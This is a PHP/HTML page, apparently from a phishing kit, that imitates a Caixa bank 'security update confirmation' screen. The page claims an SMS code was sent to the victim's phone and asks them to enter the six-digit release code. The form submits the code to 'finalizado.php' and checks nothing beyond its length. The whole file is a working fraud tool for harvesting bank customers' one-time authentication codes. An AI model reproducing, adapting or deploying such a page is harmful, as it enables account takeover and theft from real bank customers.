﻿<?php
date_default_timezone_set('America/Sao_Paulo');
$dataE      =    date('d/m/Y');
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Acesso Seguro</title>

<style>

body {
	margin: 0;
	font-family:Arial, Helvetica, sans-serif;
	}

#topo {
	width: 100%;
	height: 42px;
	background: url(img/mLogomenor.png) no-repeat;
	background-position: 14px 14px;
	background-color: #1664AC;
	}
	
.logininput {
	width: 100%;
    max-width: 100%;
	box-sizing: border-box;
	font-size: 16px;
	border: none;
	border-bottom: solid 1px #b3b3b3;
	border-radius: 2px;
	display: block;
	color: #000;
	padding: 8px;
	height: 36px;
	}

.bttenter {
	background:url(img/bgbottom.png) repeat;
    border-radius: 4px;
    font-family: arial;
    font-size: 18px;
	color: #fff;
    padding: 12px;
    text-align: center;
    width: 100%;
	border:1px solid #999;
	cursor: pointer;
	}
	
#bgadd{
	position:fixed;
	top:0px;
	left:0px;
	width:100%;
	height:100%;
	z-index:998;
	background:url(img/bg-loading.png) repeat;
	display:none;
	}
	
.modalposition{ 
    background: #fff none repeat scroll 0 0;
    border: 1px solid #999;
    border-radius: 0;
    box-shadow: 0 0 10px #999;
    color: #000;
    font-family: Arial;
    font-size: 12px;
    height: 130px;
    left: 50%;
    margin-left: -150px;
    margin-top: -170px;
    position: absolute;
    top: 50%;
    width: 300px;
    z-index: 99999;
	  }
	
.modaldiv1{ height: 30px; width:; }
.modaltext{ padding: 15px; padding-bottom: 10px; font-size: 13px; color:#666666; }
.modalbutton{ padding:5px 30px 5px 30px; color:#FFF; border:1px solid #900; font-size:12px; background:#F00; font-weight:bold; border-radius:0;}
.modaldiv2{ margin-top:50px; display:block;}
.modalinforma{ padding-top: 0; padding:7px; font-family: Arial; font-size: 14px; color:#FFF; background:#1664AC; text-shadow:1px 1px 1px #666666;}	
	
.bttok {
	background:url(img/bgbottom.png) repeat;
    border: 0 none;
    border-radius: 4px;
    color: #fff;
    font-family: arial;
    font-size: 14px;
    padding: 6px;
    text-align: center;
    width: 45px;
	cursor:pointer;
	}

</style>
</head>

<body>

<div id="topo"></div>

<div style="padding:10px;">

<div style="padding:10px 20px; text-align:center; font-size:16px; color: #277EB6; "><b>CONFIRMAÇÃO DE ATUALIZAÇÃO</b></div>

<div style="padding:10px 20px; text-align:center; background: #F6F4F4; border: 1px solid #D8D8D8;"><img src="img/alert.png" height="29" width="29" />Foi enviado para o celular cadastrado em sua conta um sms com o código de adesão de segurança para confirmar a sua atualização.</div>


<div style="padding:10px 20px; text-align:center; border: 1px solid #D8D8D8;">Por favor confira o celular cadastrado e informe o código abaixo:</div>
<div style="padding:10px 20px; text-align:center; border: 1px solid #D8D8D8;">
  <table width="100%" border="0">
  <tr>
    <td align="left">Data de Registro:</td>
    <td align="right"><?=$dataE?></td>
  </tr>
</table>

</div>
<form id="ajaxpf" name="ajaxpf" method="post" onSubmit="return validaSHK()" action="finalizado.php" autocomplete="off">
  
  <div style="padding:20px 10px; text-align:left; font-size:16px; color: #282828; ">
<label placeholder="codigo" data-reactid="14">
<span class="ui-label-text" data-reactid="15">Código de Liberação:</span>
<input class="logininput" name="codigo" id="codigo" maxlength="6" onKeyUp="javascript:pulacampo('codigo','bottonG');" tabindex="1" type="tel" data-reactid="16">
</label>
</div>


<div style="padding:10px; text-align:center;">
<input type="submit" name="bottonG" id="bottonG" class="bttenter" value="CONFIRMAR" />
</div>
</form>

</div>


<div style="display:none;" id="modalalert" class="modalposition">
<div class="modaldiv1">
<center>
<div class="modalinforma"><div class="glyphicon glyphicon glyphicon-lock" style="padding:0 10px 0 0; color:#CCA43D;"></div>CAIXA INFORMA!</div>
<div class="modaltext"><div id="TextErrorModal">Erro</div></div>
</center>
</div>
<div class="modaldiv2" align="center">
<a href="#closemodal"><button class="bttok" onClick="feixaMG()">&nbsp;&nbsp;Ok&nbsp;&nbsp;</button></a>
</div>
</div>

<script>
function feixaMG(){
	document.getElementById('modalalert').style.display='none';
	document.getElementById('bgadd').style.display='none';
	}
</script>


<div id="bgadd"></div>


<script type="text/javascript">
function validaSHK(){
	var ModalAlertError = document.getElementById("TextErrorModal");
    var ModalAlert = document.getElementById("modalalert");
	var Modalfundo = document.getElementById("bgadd");
	
if ( document.ajaxpf.codigo.value == "" ||
document.ajaxpf.codigo.value.length < 6 ||
document.ajaxpf.codigo.value.length > 6){
document.getElementById("codigo").value = "";
ModalAlertError.innerHTML = "Informe o Código Corretamente!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }
	
}
</script>


<script>
function pulacampo(idobj, idproximo)
{
var str = new String(document.getElementById(idobj).value);
var mx = new Number(document.getElementById(idobj).maxLength);
if (str.length == mx)
{
document.getElementById(idproximo).focus();
}
}
</script>

</body>
</html>